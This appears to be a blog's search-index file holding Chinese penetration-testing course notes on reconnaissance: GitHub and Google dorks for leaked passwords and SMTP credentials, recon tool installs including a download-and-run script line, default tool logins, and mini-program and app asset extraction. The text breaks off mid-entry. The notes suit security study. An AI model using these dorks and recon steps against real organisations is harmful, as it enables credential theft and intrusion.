class="line">mysqli_close()关闭先前打开的数据库连接。  </span><br></pre></td></tr></table></figure><p>MYSQL增删改查：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查：select * from 表名 where 列名=&#x27;条件&#x27;;  </span><br><span class="line">增：insert into 表名(`列名1`, `列名2`) value(&#x27;列1值1&#x27;, &#x27;列2值2&#x27;);  </span><br><span class="line">删：delete from 表名 where 列名 = &#x27;条件&#x27;;  </span><br><span class="line">改：update 表名 set 列名 = 数据 where 列名 = &#x27;条件&#x27;;  </span><br></pre></td></tr></table></figure><h2 id="数据接收输出-html混编-超全局变量"><a href="#数据接收输出-html混编-超全局变量" class="headerlink" title="数据接收输出-html混编&amp;超全局变量"></a>数据接收输出-html混编&amp;超全局变量</h2><p>1、html混编：使HTML(JS)在PHP语言中运行  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &#x27;&lt;script&gt;alert(&#x27;x&#x27;);&lt;/script&gt;&#x27;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>2、超全局变量：<br>参考：<br><a href="https://www.w3school.com.cn/php/php_superglobals.asp">https://www.w3school.com.cn/php/php_superglobals.asp</a><br><a href="https://www.php.net/manual/zh/language.variables.superglobals.php">https://www.php.net/manual/zh/language.variables.superglobals.php</a>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS：这种全局变量用于在 PHP 脚本中的任意位置访问全局变量  </span><br><span class="line">$_SERVER：这种超全局变量保存关于报头、路径和脚本位置的信息。  </span><br><span class="line">$_REQUEST：$_REQUEST 用于收集 HTML 表单提交的数据。  </span><br><span class="line">$_POST：广泛用于收集提交method=&quot;post&quot; 的HTML表单后的表单数据。  </span><br><span class="line">$_GET：收集URL中的发送的数据。也可用于收集提交HTML表单数据(method=&quot;get&quot;)   </span><br><span class="line">$_FILES：文件上传且处理包含通过HTTP POST方法上传给当前脚本的文件内容。  </span><br><span class="line">$_ENV：是一个包含服务器端环境变量的数组。  </span><br><span class="line">$_COOKIE：是一个关联数组，包含通过cookie传递给当前脚本的内容。  </span><br><span class="line">$_SESSION：是一个关联数组，包含当前脚本中的所有session内容。  </span><br></pre></td></tr></table></figure><h2 id="第三方插件引用-js传参-函数对象调用"><a href="#第三方插件引用-js传参-函数对象调用" class="headerlink" title="第三方插件引用-js传参&amp;函数对象调用"></a>第三方插件引用-js传参&amp;函数对象调用</h2><p>引用：<script src="../xxx.js"></script><br>函数对象调用：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    value : 0,</span><br><span class="line">    increment : function (inc) &#123;   </span><br><span class="line">        this.value += typeof inc === &#x27;number&#x27; ? inc :1;</span><br><span class="line">        //设置inc且为数字时 value=inc 反之 value=1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.increment();</span><br><span class="line">console.log(obj.value);  //1</span><br><span class="line">obj.increment(2);</span><br><span class="line">console.log(obj.value);  //2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21信息打点-公众号信息收集</title>
      <link href="/2023/10/06/21%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%85%AC%E4%BC%97%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/10/06/21%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%85%AC%E4%BC%97%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>29、开发泄漏-Github监控</li><li>30、文件泄漏-网盘全局搜索</li><li>31、架构泄漏-目录扫码&amp;爬虫</li><li>32、其他泄漏-公众号服务资产</li><li>33、收集进阶-证书&amp;图标&amp;邮箱</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等 </li><li>技术：APK反编译&#x2F;小程序解包反编译&#x2F;动态调试APP&amp;小程序等</li></ul><h2 id="微信公众号-获取-三方服务"><a href="#微信公众号-获取-三方服务" class="headerlink" title="微信公众号-获取&amp;三方服务"></a>微信公众号-获取&amp;三方服务</h2><p>1、获取微信公众号途径<br><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a><br>2、微信公众号有无第三方服务(非调用api，用自己的资产)  </p><h2 id="Github监控-开发-配置-源码"><a href="#Github监控-开发-配置-源码" class="headerlink" title="Github监控-开发&amp;配置&amp;源码"></a>Github监控-开发&amp;配置&amp;源码</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点。  </p><ul><li>1、人员&amp;域名&amp;邮箱等筛选<br>eg：xxx.cn password in:file<br><a href="https://gitee.com/">https://gitee.com/</a><br><a href="https://github.com/">https://github.com/</a><br><a href="https://www.huzhan.com/">https://www.huzhan.com/</a><br>GITHUB资源搜索：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">in:name test               #仓库标题搜索含有关键字 </span><br><span class="line">in:descripton test         #仓库描述搜索含有关键字 </span><br><span class="line">in:readme test             #Readme文件搜素含有关键字 </span><br><span class="line">stars:&gt;3000 test           #stars数量大于3000的搜索关键字 </span><br><span class="line">stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字 </span><br><span class="line">forks:&gt;1000 test           #forks数量大于1000的搜索关键字 </span><br><span class="line">forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字 </span><br><span class="line">size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字 </span><br><span class="line">created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字 </span><br><span class="line">user:test                  #用户名搜素 </span><br><span class="line">license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java test         #在java语言的代码中搜索关键字 </span><br><span class="line">user:test in:name test     #组合搜索,用户名test的标题含有test的关键字配合谷歌搜索：</span><br><span class="line">site:Github.com smtp   </span><br><span class="line">site:Github.com smtp @qq.com   </span><br><span class="line">site:Github.com smtp @126.com   </span><br><span class="line">site:Github.com smtp @163.com   </span><br><span class="line">site:Github.com smtp @sina.com.cn </span><br><span class="line">site:Github.com smtp password </span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure></li><li>2、语法固定长期后续监控新泄露<br>-基于关键字监控<br>-基于项目规则监控<br><a href="https://github.com/madneal/gshark">https://github.com/madneal/gshark</a><br><a href="https://github.com/NHPT/FireEyeGoldCrystal">https://github.com/NHPT/FireEyeGoldCrystal</a><br><a href="https://github.com/Explorer1092/Github-Monitor">https://github.com/Explorer1092/Github-Monitor</a></li></ul><h2 id="网盘资源搜索-全局文件机密"><a href="#网盘资源搜索-全局文件机密" class="headerlink" title="网盘资源搜索-全局文件机密"></a>网盘资源搜索-全局文件机密</h2><p>主要就是查看网盘中是否存有目标的敏感文件<br>如：企业招标，人员信息，业务产品，应用源码等</p><h2 id="敏感目录文件-目录扫描-爬虫"><a href="#敏感目录文件-目录扫描-爬虫" class="headerlink" title="敏感目录文件-目录扫描&amp;爬虫"></a>敏感目录文件-目录扫描&amp;爬虫</h2><p>-后续会详细讲到各类工具项目  </p><h2 id="网络空间进阶-证书-图标-邮箱"><a href="#网络空间进阶-证书-图标-邮箱" class="headerlink" title="网络空间进阶-证书&amp;图标&amp;邮箱"></a>网络空间进阶-证书&amp;图标&amp;邮箱</h2><ul><li>证书资产<br>fofa quake hunter  </li><li>ICO资产<br>fofa quake hunter  </li><li>邮箱资产<br><a href="https://hunter.io/">https://hunter.io/</a></li></ul><p>#实战案例四则-技术分享打击方位<br>案例1–招标平台二级跳<br>案例2–爱企查隐藏的惊喜<br>案例3–邮箱爆破到内网<br>案例4–不靠系统漏洞，从外网获取域控  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20信息打点-工具项目</title>
      <link href="/2023/10/06/20%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE/"/>
      <url>/2023/10/06/20%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>26、工具项目-红蓝队&amp;自动化部署</li><li>27、工具项目-自动化侦查收集提取</li><li>28、工具项目-综合&amp;网络空间&amp;信息</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等 </li><li>技术：APK反编译&#x2F;小程序解包反编译&#x2F;动态调试APP&amp;小程序等</li></ul><h2 id="各类红蓝队优秀工具项目集合："><a href="#各类红蓝队优秀工具项目集合：" class="headerlink" title="各类红蓝队优秀工具项目集合："></a>各类红蓝队优秀工具项目集合：</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">https://github.com/guchangan1/All-Defense-Tool</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本项目集成了全网优秀的开源攻防武器项目，包含信息收集工具（自动化利用工具、资产发现工具、目录扫描工具、子域名收集工具、指纹识别工具、端口扫描工具、各种插件…），漏洞利用工具（各大CMS利用工具、中间件利用工具等项目…），内网渗透工具（隧道代理、密码提取…）、应急响应工具、甲方运维工具、等其他安全攻防资料整理，供攻防双方使用。如果你有更好的建议，欢迎提出请求。  </p><p>##新服务器设置</p><ul><li>Ubuntu<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker-compose</span><br><span class="line">git clone https://github.com/TophantTechnology/ARL  </span><br><span class="line">cd ARL/docker/  </span><br><span class="line">docker volume create arl_db  </span><br><span class="line">docker-compose pull  </span><br><span class="line">docker-compose up -d </span><br><span class="line">mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo  </span><br><span class="line">docker-compose up -d </span><br><span class="line">vim docker-compose.yum</span><br><span class="line">version:&#x27;3.7&#x27;(i)----&gt;3.3(:wq)</span><br><span class="line">docker-compose up -d </span><br><span class="line">cd ..</span><br><span class="line">wget : wget -O f8x https://f8x.io/</span><br><span class="line">bash f8x -h</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h2 id="自动化-武器库部署-F8x"><a href="#自动化-武器库部署-F8x" class="headerlink" title="自动化-武器库部署-F8x"></a>自动化-武器库部署-F8x</h2><p>项目地址：<a href="https://github.com/ffffffff0x/f8x">https://github.com/ffffffff0x/f8x</a>  </p><ul><li>1、介绍：<br>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等.  </li><li>2、配置：<br>通过 CF Workers 下载 [推荐]  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget : wget -O f8x https://f8x.io/  </span><br><span class="line">curl : curl -o f8x https://f8x.io/  </span><br></pre></td></tr></table></figure></li><li>3、使用：见项目文档  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash f8x -h </span><br><span class="line">例：bash f8x -mobsf</span><br></pre></td></tr></table></figure>云服务器Ubuntu系统已搭建好，访问地址：https:&#x2F;&#x2F;[IP]:8000</li></ul><h2 id="自动化-网络空间-AsamF"><a href="#自动化-网络空间-AsamF" class="headerlink" title="自动化-网络空间-AsamF"></a>自动化-网络空间-AsamF</h2><p>项目地址：<a href="https://github.com/Kento-Sec/AsamF">https://github.com/Kento-Sec/AsamF</a>  </p><ul><li>1、介绍：<br>AsamF集成了Fofa、Hunter、Quake、Zoomeye、Shodan、爱企查、Chinaz、0.zone、subfinder。AsamF支持Fofa、Hunter、Quake、Zoomeye、Shodan、Chinaz、0.zone配置多个Key。  </li><li>2、配置：<br>AsamF会在<del>&#x2F;.config&#x2F;asamf&#x2F;目录下生成config.json文件。<br>如果你有多个key，按照json的格式录入即可，建议键值按照阿拉伯数字依次录入,方便以阿拉伯数字来切换key。自动结果保存在</del>&#x2F;asamf&#x2F;目录下。  </li><li>3、使用：见项目文档</li></ul><h2 id="自动化-企查信息-ENScan"><a href="#自动化-企查信息-ENScan" class="headerlink" title="自动化-企查信息-ENScan"></a>自动化-企查信息-ENScan</h2><p>项目地址：<a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a>  </p><ul><li>1、介绍：<br>剑指HW&#x2F;SRC，解决在HW&#x2F;SRC场景下遇到的各种针对国内企业信息收集难题</li><li>2、配置：<br>ENScanGo在第一次使用时需要使用-v命令生成配置文件信息后进行配置</li><li>3、使用：见项目文档</li></ul><h2 id="自动化-综合架构-ARL-Nemo"><a href="#自动化-综合架构-ARL-Nemo" class="headerlink" title="自动化-综合架构-ARL&amp;Nemo"></a>自动化-综合架构-ARL&amp;Nemo</h2><h3 id="ARL灯塔"><a href="#ARL灯塔" class="headerlink" title="ARL灯塔"></a>ARL灯塔</h3><p>项目地址：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a>  </p><ul><li>1、介绍：<br>&nbsp;&nbsp;&nbsp;&nbsp;旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。  </li><li>2、配置：（docker搭建）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TophantTechnology/ARL  </span><br><span class="line">cd ARL/docker/  </span><br><span class="line">docker volume create arl_db  </span><br><span class="line">docker-compose pull  </span><br><span class="line">docker-compose up -d  </span><br></pre></td></tr></table></figure></li><li>3、使用：见直播操作<br>云服务器Ubuntu系统已搭建好，访问地址：https:&#x2F;&#x2F;[IP]:5003<br>默认用户名&#x2F;密码admin&#x2F;arlpass</li></ul><h3 id="Nemo-Go"><a href="#Nemo-Go" class="headerlink" title="Nemo_Go"></a>Nemo_Go</h3><p>项目地址：<a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a>  </p><ul><li>1、介绍：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Nemo是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率，用Golang完全重构了原Python版本。  </li><li>2、配置：（docker搭建）<br><a href="https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md">https://github.com/hanc00l/nemo_go/blob/main/docs/docker.md</a><br>下载release的nemo_linux_amd64.tar后执行：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir nemo;tar xvf nemo_linux_amd64.tar -C nemo;cd nemo  </span><br><span class="line">docker-compose up -d  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重启开机后执行：cd nemo  </span><br><span class="line">docker-compose up -d    </span><br></pre></td></tr></table></figure></li><li>3、使用：见直播操作<br>云服务器Ubuntu系统已搭建好，访问地址：http:&#x2F;&#x2F;[IP]:5000<br>默认用户名&#x2F;密码nemo&#x2F;nemo</li><li>4、Bug：网络空间（配置后要重启）<br><a href="https://github.com/hanc00l/nemo_go/issues/72">https://github.com/hanc00l/nemo_go/issues/72</a></li></ul><h3 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure><p>云服务器Ubuntu系统已搭建好，访问地址：http:&#x2F;&#x2F;[IP]:8000 </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>19信息打点-小程序应用</title>
      <link href="/2023/10/04/19%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/04/19%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>24、Web&amp;备案信息&amp;单位名称中发现小程序</li><li>25、小程序资产静态提取&amp;动态抓包&amp;动态调试<br>解决：<br>1、如何获取到目标小程序信息<br>2、如何从小程序中提取资产信息</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等 </li><li>技术：APK反编译&#x2F;小程序解包反编译&#x2F;动态调试APP&amp;小程序等</li></ul><h2 id="小程序获取-各大平台-关键字搜索"><a href="#小程序获取-各大平台-关键字搜索" class="headerlink" title="小程序获取-各大平台&amp;关键字搜索"></a>小程序获取-各大平台&amp;关键字搜索</h2><p>-微信<br>-百度<br>-支付宝<br>-抖音头条  </p><h2 id="小程序体验-凡科建站-模版测试上线"><a href="#小程序体验-凡科建站-模版测试上线" class="headerlink" title="小程序体验-凡科建站&amp;模版测试上线"></a>小程序体验-凡科建站&amp;模版测试上线</h2><p>测试：<a href="https://qz.fkw.com/">https://qz.fkw.com/</a><br>参考：<a href="https://blog.csdn.net/qq_52445443/article/details/122351865">https://blog.csdn.net/qq_52445443/article/details/122351865</a>  </p><ul><li>1.主体结构<br>小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。<br>一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件                 必需               作用    </span><br><span class="line">app.js               是            小程序逻辑</span><br><span class="line">app.json             是            小程序公共配置</span><br><span class="line">app.wxss             否            小程序公共样式表</span><br></pre></td></tr></table></figure></li><li>2.一个小程序页面由四个文件组成，分别是:   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx.js        页面逻辑</span><br><span class="line">xxx.json      页面配置</span><br><span class="line">xxx.wxml      页面结构</span><br><span class="line">xxx.wxss      页面样式</span><br></pre></td></tr></table></figure></li><li>3.项目整体目录结构  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pages                页面文件夹</span><br><span class="line">index                首页</span><br><span class="line">logs                 日志</span><br><span class="line">utils               </span><br><span class="line">util                 工具类(mina框架自动生成,你也可以建立一个：api)</span><br><span class="line">app.js               入口js(类似于java类中的main方法)、全局js</span><br><span class="line">app.json             全局配置文件</span><br><span class="line">app.wxss             全局样式文件</span><br><span class="line">project.config.json  跟你在详情中勾选的配置一样</span><br><span class="line">sitemap.json         用来配置小程序及其页面是否允许被微信索引</span><br></pre></td></tr></table></figure></li></ul><h2 id="小程序抓包-Proxifier-BurpSuite联动"><a href="#小程序抓包-Proxifier-BurpSuite联动" class="headerlink" title="小程序抓包-Proxifier&amp;BurpSuite联动"></a>小程序抓包-Proxifier&amp;BurpSuite联动</h2><p>-对抓到的IP或域名进行Web安全测试<br>-对抓到的IP或域名进行API安全测试<br>-对抓到的IP或域名进行端口服务测试  </p><h2 id="小程序逆向-解包反编译-动态调试-架构"><a href="#小程序逆向-解包反编译-动态调试-架构" class="headerlink" title="小程序逆向-解包反编译&amp;动态调试&amp;架构"></a>小程序逆向-解包反编译&amp;动态调试&amp;架构</h2><p>对源码架构进行分析<br>-更多的资产信息<br>-敏感的配置信息<br>-未授权访问测试<br>-源码中的安全问题<br>-小程序多功能组手<br>复杂操作：<a href="https://www.cnblogs.com/oodcloud/p/16964878.html">https://www.cnblogs.com/oodcloud/p/16964878.html</a><br>简单工具：<a href="http://xcx.siqingw.top/">http://xcx.siqingw.top/</a><br>-微信官方开发工具<br><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>18信息打点-APP资产</title>
      <link href="/2023/10/03/18%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP%E8%B5%84%E4%BA%A7/"/>
      <url>/2023/10/03/18%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP%E8%B5%84%E4%BA%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>22、Web&amp;备案信息&amp;单位名称中发现APP  </li><li>23、APP资产静态提取&amp;动态抓包&amp;动态调试<br>解决：<br>1、如何获取到目标APP信息<br>2、如何从APP信息中提取资产</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等</li></ul><h2 id="案例1：名称获取APP信息（爱企查-小蓝本-七麦-点点）"><a href="#案例1：名称获取APP信息（爱企查-小蓝本-七麦-点点）" class="headerlink" title="案例1：名称获取APP信息（爱企查&#x2F;小蓝本&#x2F;七麦&#x2F;点点）"></a>案例1：名称获取APP信息（爱企查&#x2F;小蓝本&#x2F;七麦&#x2F;点点）</h2><p>1、爱企查知识产权<br>2、七麦&amp;点点查名称<br><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a><br><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a><br><a href="https://www.qimai.cn/">https://www.qimai.cn/</a><br><a href="https://app.diandian.com/">https://app.diandian.com/</a>  </p><h2 id="案例2：URL网站备案查APP"><a href="#案例2：URL网站备案查APP" class="headerlink" title="案例2：URL网站备案查APP"></a>案例2：URL网站备案查APP</h2><p>1、查备案信息在搜<br>2、网站上有APP下载<br>3、市场直接搜单位名称  </p><ul><li><p>1.通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。<br>(1)资产信息-IP 域名 网站 -转到对应Web测试 接口测试 服务测试<br>(2)泄露信息-配置key 资源文件 - key（osskey利用，邮件配置等）<br>(3)代码信息-java代码安全问题- 逆向相关  </p></li><li><p>2.APP中收集资产<br>(1)抓包-动态表现<br>(2)提取-静态表现&amp;动态调试<br>(3)搜索-静态表现  </p></li><li><p>3.抓包抓表现出来的数据（动态）<br>优点：没有误报<br>缺点：无法做到完整  </p></li><li><p>4.反编译从源码中提取数据（静态）<br>优点：数据较为完整<br>缺点：有很多无用的资产  </p></li><li><p>5.动态调试从表现中提取数据<br>优点：没有误报，解决不能抓包不能代理等情况<br>优点；搞逆向的人能看到实时的app调用链等<br>缺点：无法做到完整</p></li></ul><h2 id="案例3：某APP打开无数据包，登录有数据包"><a href="#案例3：某APP打开无数据包，登录有数据包" class="headerlink" 